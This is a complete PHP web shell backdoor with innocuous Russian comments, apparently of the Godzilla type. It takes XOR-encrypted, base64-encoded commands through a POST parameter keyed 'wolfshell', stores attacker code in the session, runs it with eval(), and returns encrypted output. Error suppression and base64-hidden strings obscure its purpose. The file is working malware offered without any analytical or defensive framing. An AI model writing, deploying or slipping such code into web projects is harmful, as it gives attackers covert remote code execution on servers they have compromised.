<?php
// Инициализация сеанса
@session_start();
// Сброс лимита времени
@set_time_limit(0);
// Подавление ошибок
@error_reporting(0);
// Основная функция преобразования
function handle_bytes($bytes, $key_data){
    // Цикл по данным
    for($i=0; $i<strlen($bytes); $i++) {
        // Получение символа ключа
        $key_character = $key_data[$i+1&15];
        // Применение XOR
        $bytes[$i] = $bytes[$i]^$key_character;
    }
    // Возврат обработанных данных
    return $bytes;
}
// Ключ доступа
$auth_token = base64_decode('d29sZnNoZWxs');
// Имя контейнера в сессии
$session_storage_name = base64_decode('cGF5bG9hZA==');
// Секретный шифр
$secret_material = '3c6e0b8a9c15224a';
// Проверка метода запроса
if (isset($_POST[$auth_token])){
    // Обработка входящих данных
    $request_payload = handle_bytes(base64_decode($_POST[$auth_token]), $secret_material);
    // Проверка наличия сессии
    if (isset($_SESSION[$session_storage_name])){
        // Извлечение данных из сессии
        $stored_code = handle_bytes($_SESSION[$session_storage_name], $secret_material);
        // Проверка на наличие команды
        if (strpos($stored_code, base64_decode('Z2V0QmFzaWNzSW5mbw==')) === false){
            // Повторное преобразование
            $stored_code = handle_bytes($stored_code, $secret_material);
        }
        // Исполнение кода
		eval($stored_code);
        // Отправка первой части ответа
        echo substr(md5($auth_token.$secret_material), 0, 16);
        // Отправка основного ответа
        echo base64_encode(handle_bytes(@run($request_payload), $secret_material));
        // Отправка второй части ответа
        echo substr(md5($auth_token.$secret_material), 16);
    } else {
        // Условие для сохранения сессии
        if (strpos($request_payload, base64_decode('Z2V0QmFzaWNzSW5mbw==')) !== false){
            // Сохранение данных в сессию
            $_SESSION[$session_storage_name] = handle_bytes($request_payload, $secret_material);
        }
    }
}
